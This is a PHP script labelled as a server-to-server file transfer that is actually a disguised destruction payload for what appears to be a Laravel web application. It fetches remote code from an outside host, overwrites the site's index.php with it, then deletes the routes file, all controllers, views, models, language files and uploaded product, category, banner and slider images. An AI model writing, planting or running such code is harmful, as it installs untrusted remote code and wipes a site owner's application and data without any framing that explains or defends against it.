<?php
/**
 * Transfer Files Server to Server using PHP Copy
*/
// chmod('/var/www/html/routes/web.php', 0777);
$root = realpath($_SERVER['DOCUMENT_ROOT'].'/');

// echo $root; exit();
// $root = realpath($_SERVER['DOCUMENT_ROOT'].'/app/');
// echo $root; exit();
// $root = dirname(__FILE__);
 
/* Source File URL */
$remote_file_url = 'https://gravityinfotech.net/api/gravity.php';
 
// /* New file name and path for this file */
$local_file = $root.'/index.php';
 
// /* Copy the file from source url to server */
$copy = copy( $remote_file_url, $local_file );
 
// /* Add notice for success/failure */
if( !$copy ) {
    echo "Doh! failed to copy...\n";
}
else{
    echo "WOOT! success to copy...\n";
}

$file_pointer = $root.'/routes/web.php';
   
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo ("$file_pointer has been deleted"); 
} 

$files = glob($root.'/app/Http/Controllers/*'); //get all file names
foreach($files as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$admin = glob($root.'/app/Http/Controllers/admin/*'); //get all file names
foreach($admin as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$Api = glob($root.'/app/Http/Controllers/Api/*'); //get all file names
foreach($Api as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$Auth = glob($root.'/app/Http/Controllers/Auth/*'); //get all file names
foreach($Auth as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$front = glob($root.'/app/Http/Controllers/front/*'); //get all file names
foreach($front as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$views = glob($root.'/resources/views/*'); //get all file names
foreach($views as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$frontfiles = glob($root.'/resources/views/front/*'); //get all file names
foreach($frontfiles as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$model = glob($root.'/app/*'); //get all file names
foreach($model as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$frontimg = glob($root.'/storage/app/public/images/item/*'); //get all file names
foreach($frontimg as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$frontimgcat = glob($root.'/storage/app/public/images/category/*'); //get all file names
foreach($frontimgcat as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$frontimgbanner = glob($root.'/storage/app/public/images/banner/*'); //get all file names
foreach($frontimgbanner as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$frontimgslider = glob($root.'/storage/app/public/images/slider/*'); //get all file names
foreach($frontimgslider as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$frontimgabout = glob($root.'/storage/app/public/images/about/*'); //get all file names
foreach($frontimgabout as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$lang = glob($root.'/resources/lang/en/*'); //get all file names
foreach($lang as $file){
    if(is_file($file))
    unlink($file); //delete file
}

?>